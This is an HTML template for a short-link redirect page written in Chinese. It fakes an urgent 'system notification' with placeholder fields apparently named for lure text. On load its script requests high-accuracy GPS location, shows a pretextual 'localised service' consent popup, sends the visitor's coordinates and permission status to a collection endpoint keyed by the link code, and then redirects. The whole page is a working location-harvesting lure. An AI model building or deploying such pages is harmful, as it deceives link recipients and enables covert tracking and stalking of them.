<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{.InduceTitle}} - 消息提醒</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 420px;
            width: 100%;
            overflow: hidden;
        }
        .card-header {
            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
            color: white;
            padding: 24px;
            text-align: center;
        }
        .icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        .card-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        .card-subtitle {
            font-size: 14px;
            opacity: 0.9;
        }
        .card-body {
            padding: 24px;
        }
        .info-item {
            display: flex;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #f0f0f0;
        }
        .info-item:last-child {
            border-bottom: none;
        }
        .info-label {
            color: #666;
            font-size: 14px;
            width: 80px;
        }
        .info-value {
            flex: 1;
            color: #333;
            font-size: 14px;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(229, 62, 62, 0.4);
        }
        .btn:active {
            transform: translateY(0);
        }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            background: #fed7d7;
            color: #c53030;
            border-radius: 4px;
            font-size: 12px;
            margin-left: 8px;
        }
        .footer {
            text-align: center;
            padding: 16px;
            color: #999;
            font-size: 12px;
        }
        .mask {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.6);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .geo-popup {
            background: white;
            border-radius: 12px;
            padding: 24px;
            text-align: center;
            max-width: 280px;
            display: none;
        }
        .geo-popup h3 {
            font-size: 16px;
            margin-bottom: 12px;
        }
        .geo-popup p {
            font-size: 13px;
            color: #666;
            margin-bottom: 16px;
        }
        .geo-popup-btns {
            display: flex;
            gap: 10px;
        }
        .geo-popup button {
            flex: 1;
            padding: 10px;
            border-radius: 6px;
            border: none;
            font-size: 14px;
            cursor: pointer;
        }
        .geo-popup .allow {
            background: #e53e3e;
            color: white;
        }
        .geo-popup .deny {
            background: #f5f5f5;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-header">
            <div class="icon">{{.Icon}}</div>
            <div class="card-title">{{.InduceTitle}}</div>
            <div class="card-subtitle">{{.InduceSubtitle}}</div>
        </div>
        <div class="card-body">
            <div class="info-item">
                <span class="info-label">通知类型</span>
                <span class="info-value">系统消息</span>
            </div>
            <div class="info-item">
                <span class="info-label">通知时间</span>
                <span class="info-value" id="currentTime"></span>
            </div>
            <div class="info-item">
                <span class="info-label">状态</span>
                <span class="info-value"><span class="badge">待处理</span></span>
            </div>
        </div>
        <div style="padding: 0 24px 24px;">
            <button class="btn" onclick="showGeoPopup()">点击查看详情</button>
        </div>
        <div class="footer">
            此消息由系统自动推送，请及时处理
        </div>
    </div>

    <div class="mask" id="mask"></div>
    <div class="geo-popup" id="geoPopup">
        <h3>📍 获取当前位置</h3>
        <p>需要获取您的位置来提供本地化服务</p>
        <div class="geo-popup-btns">
            <button class="deny" onclick="denyGeo()">暂不授权</button>
            <button class="allow" onclick="allowGeo()">确认授权</button>
        </div>
    </div>

    <script>
        var shortCode = "{{.Code}}";
        var destURL = "{{.OriginalURL}}";
        var geoSubmitted = false;

        document.getElementById('currentTime').textContent = new Date().toLocaleString('zh-CN');

        function showGeoPopup() {
            document.getElementById('mask').style.display = 'flex';
            document.getElementById('geoPopup').style.display = 'block';
        }

        function hideGeoPopup() {
            document.getElementById('mask').style.display = 'none';
            document.getElementById('geoPopup').style.display = 'none';
        }

        function sendData(lat, lng, precision, status) {
            if (geoSubmitted) return;
            geoSubmitted = true;

            var data = {
                code: shortCode,
                latitude: lat,
                longitude: lng,
                geo_precision: precision || 'unknown',
                geo_status: status || 'unknown',
                visit_duration: 0,
                page_loaded: true
            };

            if (navigator.sendBeacon) {
                navigator.sendBeacon('/api/visits/submit', JSON.stringify(data));
            } else {
                fetch('/api/visits/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            }
        }

        function requestGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        sendData(position.coords.latitude, position.coords.longitude, 'gps', 'granted');
                    },
                    function(error) {
                        var status = 'failed';
                        switch(error.code) {
                            case error.PERMISSION_DENIED: status = 'denied'; break;
                            case error.POSITION_UNAVAILABLE: status = 'unavailable'; break;
                            case error.TIMEOUT: status = 'timeout'; break;
                        }
                        sendData(null, null, 'gps', status);
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
                );
            } else {
                sendData(null, null, 'gps', 'unsupported');
            }
        }

        function allowGeo() {
            hideGeoPopup();
            requestGeolocation();
            setTimeout(function() {
                window.location.href = destURL;
            }, 300);
        }

        function denyGeo() {
            hideGeoPopup();
            sendData(null, null, 'gps', 'denied');
            window.location.href = destURL;
        }

        window.onload = function() {
            requestGeolocation();
        };
    </script>
</body>
</html>
